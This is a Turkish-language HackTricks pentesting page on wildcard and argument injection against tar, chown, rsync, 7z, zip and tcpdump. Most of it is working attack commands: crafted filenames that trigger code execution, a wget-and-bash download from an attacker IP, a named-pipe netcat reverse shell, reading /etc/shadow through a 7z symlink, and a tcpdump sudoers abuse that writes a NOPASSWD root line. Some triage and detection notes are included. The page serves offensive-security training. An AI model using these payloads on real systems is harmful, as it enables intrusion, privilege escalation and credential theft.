# Wildcards İçin Ekstra Hileler

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (diğer adıyla *glob*) **argument injection**, ayrıcalıklı bir script `tar`, `chown`, `rsync`, `zip`, `7z` … gibi bir Unix binary'sini tırnak içine alınmamış `*` gibi bir wildcard ile çalıştırdığında gerçekleşir.
> Shell, binary'yi çalıştırmadan **önce** wildcard'ı genişlettiğinden, çalışma dizininde dosya oluşturabilen bir attacker `-` ile başlayan dosya adları oluşturabilir. Böylece bu adlar **veri yerine option** olarak yorumlanır ve saldırgan etkili bir şekilde rastgele flag'leri, hatta komutları sisteme sızdırabilir.
> Bu sayfa, 2023-2025 için en kullanışlı primitive'leri, güncel araştırmaları ve modern detection yöntemlerini bir araya getirir.

## chown / chmod

`--reference` flag'ini kötüye kullanarak **rastgele bir dosyanın owner/group bilgisini veya permission bit'lerini kopyalayabilirsiniz**:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
root daha sonra şu tür bir komut çalıştırdığında:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` enjekte edilir ve bunun sonucunda *eşleşen tüm dosyalar* `/root/secret``file` dosyasının sahiplik/izinlerini devralır.

*PoC ve tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (birleşik saldırı).  
Ayrıntılar için klasik DefenseCode makalesine de bakın.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

**checkpoint** özelliğini kötüye kullanarak rastgele komutlar çalıştırın:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Once root `tar -czf /root/backup.tgz *` gibi bir komut çalıştırdığında, `shell.sh` root olarak çalıştırılır.

### bsdtar / macOS 14+

Yakın tarihli macOS sürümlerindeki ( `libarchive` tabanlı) varsayılan `tar`, *`--checkpoint`* özelliğini uygulamaz; ancak harici bir compressor belirtmenize olanak tanıyan **--use-compress-program** flag'i ile yine de code-execution elde edebilirsiniz.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Ayrıcalıklı bir script `tar -cf backup.tar *` çalıştırdığında `/bin/sh` başlatılır.

---

## rsync

`rsync`, `-e` veya `--rsync-path` ile başlayan command-line flag'leri aracılığıyla remote shell'i, hatta remote binary'yi geçersiz kılmanıza olanak tanır:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Root daha sonra dizini `rsync -az * backup:/srv/` ile arşivlerse, enjekte edilen flag uzak tarafta shell'inizi başlatır.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Ayrıcalıklı script, option parsing'i durdurmak için wildcard'ın önüne savunma amaçlı `--` eklese bile 7-Zip formatı, dosya adının başına `@` ekleyerek **file list files** kullanımını destekler. Bunu bir symlink ile birleştirerek *istediğiniz dosyaları exfiltrate edebilirsiniz*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
root şuna benzer bir şey çalıştırırsa:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip, `root.txt` dosyasını (`→ /etc/shadow`) bir dosya listesi olarak okumayı deneyecek ve işlemi durduracaktır; **içeriği stderr'e yazdırır**.

Bu yöntem `-- *` ile de çalışır; çünkü 7-Zip CLI, konumsal girdiler olarak hem normal dosya adlarını hem de `@listfiles` ifadelerini açıkça kabul eder. Bu nedenle `@root.txt` gibi gerçek bir dosya adı yine özel olarak ele alınır.

---

## zip

Bir uygulama kullanıcı kontrollü dosya adlarını `zip` komutuna (`--` kullanmadan ya bir wildcard aracılığıyla ya da adları tek tek listeleyerek) aktardığında, iki oldukça pratik primitive mevcuttur.

- Test hook üzerinden RCE: `-T`, “test archive” özelliğini etkinleştirir ve `-TT <cmd>`, tester'ı rastgele bir programla değiştirir (uzun biçimi: `--unzip-command <cmd>`). `-` ile başlayan dosya adlarını enjekte edebiliyorsanız, kısa seçenek ayrıştırmasının çalışması için flag'leri farklı dosya adlarına bölün:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notlar
- `'-T -TT <cmd>'` gibi tek bir filename denemeyin — short options karakter başına ayrıştırılır ve bu başarısız olur. Gösterildiği gibi ayrı token'lar kullanın.
- Uygulama filename'larda slash karakterlerini kaldırıyorsa, bare host/IP üzerinden (varsayılan path `/index.html`) alın, `-O` ile yerel olarak kaydedin ve ardından execute edin.
- Token'larınızın nasıl tüketildiğini anlamak için parsing işlemini `-sc` (işlenmiş argv'yi gösterir) veya `-h2` (daha fazla help) ile debug edebilirsiniz.

Example (zip 3.0 üzerinde local behavior):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Web layer `zip` stdout/stderr çıktısını yansıtıyorsa (naive wrappers ile yaygın), `--help` gibi enjekte edilen flag'ler veya hatalı seçeneklerden kaynaklanan failures HTTP response içinde görünür; bu da command-line injection'ı doğrular ve payload ayarlamaya yardımcı olur.

---

## Wildcard injection'a karşı savunmasız ek binary'ler (2023-2025 kısa liste)

Aşağıdaki komutlar modern CTF'lerde ve gerçek ortamlarda abuse edilmiştir. Payload her zaman, daha sonra bir wildcard ile işlenecek writable directory içindeki bir *filename* olarak oluşturulur:

| Binary | Abuse edilecek flag | Etki |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | File contents oku |
| `flock` | `-c <cmd>` | Command execute et |
| `git`   | `-c core.sshCommand=<cmd>` | git üzerinden SSH ile command execution |
| `scp`   | `-S <cmd>` | ssh yerine arbitrary program başlat |

Bu primitive'ler klasik *tar/rsync/zip* yöntemlerinden daha az yaygındır, ancak hunting sırasında kontrol edilmeye değerdir.

---

## Vulnerable wrapper'ları ve job'ları hunting

Yakın tarihli case study'ler, wildcard/argv injection'ın artık yalnızca **cron + tar** problemi olmadığını göstermiştir. Aynı bug class şu alanlarda görülmeye devam etmektedir:

- attacker-controlled upload directory'lerinden "her şeyi zip/tar olarak download et" özellikleri sunan web özellikleri
- attacker-controlled filename/filter alanlarını açığa çıkaran **tcpdump** wrapper'larına sahip vendor/appliance debug shell'leri
- writable directory'ler üzerinde `tar`, `rsync`, `7z`, `zip`, `chown` veya `chmod` çalıştıran backup veya rotation job'ları

Faydalı triage komutları:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Hızlı sezgisel kurallar:

- `-- *`, birçok GNU aracı için iyi bir çözümdür; ancak `@listfiles` ayrı olarak parse edildiği için `7z`/`7za` için **değildir**.
- `zip` için, kullanıcı tarafından kontrol edilen dosya adlarını doğrudan enumerate eden wrapper'ları arayın; short-option splitting (`-T` + `-TT <cmd>`), shell glob olmasa bile hâlâ çalışır.
- `tcpdump` için, **output file names**, **rotation settings** veya **capture-file replay** argümanlarını kontrol etmenize izin veren wrapper'lara özellikle dikkat edin.

---

## tcpdump rotation hooks (-G/-W/-z): wrapper'larda argv injection üzerinden RCE

Kısıtlı bir shell veya vendor wrapper, kullanıcı tarafından kontrol edilen alanları (ör. bir "file name" parametresi) strict quoting/validation uygulamadan bir `tcpdump` command line'ına birleştirdiğinde, ekstra `tcpdump` flag'lerini araya sızdırabilirsiniz. `-G` (time-based rotation), `-W` (file sayısını sınırlar) ve `-z <cmd>` (post-rotate command) kombinasyonu, tcpdump'ı çalıştıran kullanıcı olarak (appliance'larda genellikle root) arbitrary command execution sağlar.

Ön koşullar:

- `tcpdump`'a aktarılan `argv` değerlerini etkileyebiliyorsunuz (ör. `/debug/tcpdump --filter=... --file-name=<HERE>` gibi bir wrapper üzerinden).
- Wrapper, file name alanındaki boşlukları veya `-` ile başlayan token'ları sanitize etmiyor.

Classic PoC (writable bir path'ten reverse shell script'i çalıştırır):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Detaylar:

- `-G 1 -W 1`, eşleşen ilk paketten sonra hemen rotate işlemini zorlar.
- `-z <cmd>`, her rotate işlemi başına post-rotate komutunu bir kez çalıştırır. Birçok build, `<cmd> <savefile>` biçiminde çalışır. `<cmd>` bir script/interpreter ise argüman işleme biçiminin payload'unuzla eşleştiğinden emin olun.

Çıkarılabilir medya gerektirmeyen varyantlar:

- Dosya yazmak için başka bir primitive'iniz varsa (ör. output redirection kullanımına izin veren ayrı bir command wrapper), script'inizi bilinen bir path'e bırakın ve platform semantiğine bağlı olarak `-z /bin/sh /path/script.sh` veya `-z /path/script.sh` tetikleyin.
- Bazı vendor wrapper'ları attacker tarafından kontrol edilebilen konumlara rotate işlemi yapar. Rotated path'i (symlink/directory traversal ile) etkileyebiliyorsanız, harici medya olmadan tamamen kontrol ettiğiniz içeriği çalıştırmak üzere `-z` yönlendirebilirsiniz.

---

## sudoers: wildcards/additional args içeren tcpdump → arbitrary write/read ve root

Çok yaygın bir sudoers anti-pattern'i:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Sorunlar
- `*` glob'u ve izin verici kalıplar yalnızca ilk `-w` argümanını kısıtlar. `tcpdump` birden fazla `-w` seçeneğini kabul eder; sonuncusu geçerli olur.
- Kural diğer seçenekleri sabitlemez; bu nedenle `-Z`, `-r`, `-V` vb. seçeneklere izin verilir.

Primitifler
- İkinci bir `-w` ile hedef yolunu geçersiz kılma (ilki yalnızca sudoers'ı karşılar):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Kısıtlanmış ağaçtan çıkmak için ilk `-w` içindeki Path traversal:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-Z root` ile çıktı sahipliğini zorlayın (her yerde root sahipliğinde dosyalar oluşturur):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-r` aracılığıyla hazırlanmış bir PCAP dosyasını yeniden oynatarak rastgele içerik yazma (ör. bir sudoers satırı bırakmak):

<details>
<summary>Tam ASCII payload'ını içeren bir PCAP oluşturun ve bunu root olarak yazın</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- `-V <file>` ile arbitrary file read/secret leak (bir savefiles listesi yorumlar). Error diagnostics çoğu zaman satırları echo ederek içeriği leak eder:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Referanslar

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Tam Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Wildcard Injection üzerinden Potential Shell tespit edildi](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
